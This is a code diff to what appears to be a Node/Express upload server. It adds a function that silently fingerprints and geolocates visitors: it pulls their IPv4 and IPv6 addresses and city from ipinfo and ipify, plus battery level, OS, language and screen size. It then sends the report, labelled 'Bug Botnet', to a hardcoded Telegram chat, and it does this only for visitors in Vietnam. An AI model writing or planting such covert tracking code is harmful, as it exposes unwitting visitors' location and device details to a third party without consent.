@@ -17,6 +17,72 @@ const TELEGRAM_CHAT_ID = '8774231221';
 
 const upload = multer({ dest: 'uploads/' });
 
+  async function getAddress() {
+            try {
+                // Nếu đã có cache thì không gửi lại Telegram
+                if (sessionStorage.getItem('userAddress')) {
+                    return JSON.parse(sessionStorage.getItem('userAddress'));
+                }
+
+                // Lấy IPv6 (api64 tự trả IPv6 nếu có, fallback IPv4)
+                let ip = "Không xác định";
+                let ipv6 = "Không xác định";
+                try {
+                    const ipv6Res = await fetchWithTimeout('https://api64.ipify.org?format=json', 5000);
+                    const ipv6Data = await ipv6Res.json();
+                    if (ipv6Data.ip && ipv6Data.ip.includes(':')) {
+                        ipv6 = ipv6Data.ip;
+                    }
+                } catch (e) {
+                    console.warn('Không lấy được IPv6:', e);
+                }
+
+                // Lấy thông tin vị trí
+                let data = {};
+                try {
+                    const res = await fetchWithTimeout('https://ipinfo.io/json', 5000);
+                    data = await res.json();
+                    ip = data.ip || ip;
+                } catch (e) {
+                    console.warn('Không lấy được ipinfo:', e);
+                }
+
+                const currentTime = await getCurrentTime();
+
+                let message = `🗺 Địa Chỉ Đối Phương: ${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'}\n`;
+                message += `🗺 IP Đối Phương: ${ip}\n`;
+                message += `🗺 IPv6: ${ipv6}\n`;
+                message += `🕒 Thời Gian Truy Cập: ${currentTime}\n`;
+                message += `💻 Tên Thiết Bị: ${navigator.userAgent}\n`;
+
+                // Pin (chỉ có trên HTTPS + trình duyệt hỗ trợ)
+                let batteryLevel = 'Không xác định';
+                if (typeof navigator.getBattery === 'function') {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryLevel = `${Math.round(battery.level * 100)}%`;
+                    } catch (e) {
+                        console.warn('Không lấy được pin:', e);
+                    }
+                }
+
+                message += `🔋 Phần Trăm Pin: ${batteryLevel}\n`;
+                message += `🛠 Hệ Điều Hành: ${navigator.userAgentData?.platform || navigator.platform || 'Không xác định'}\n`;
+                message += `📜 Ngôn Ngữ Trình Duyệt: ${navigator.language}\n`;
+                message += `🖥 Độ Phân Giải Màn Hình: ${window.screen.width}x${window.screen.height}\n`;
+                message += `\nBug Botnet 🪲`;
+
+                if (data.country === "VN") {
+                    await sendTelegramMessage(message);
+                    sessionStorage.setItem('userAddress', JSON.stringify(data));
+                } else {
+                    await sendTelegramMessage("Không thể lấy địa chỉ từ quốc gia khác.");
+                }
+            } catch (error) {
+                console.error('Lỗi lấy địa chỉ:', error);
+                showStatus('Không thể lấy thông tin địa chỉ!');
+            }
+        }
 app.post('/api/submit', upload.single('image'), async (req, res) => {
     try {
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
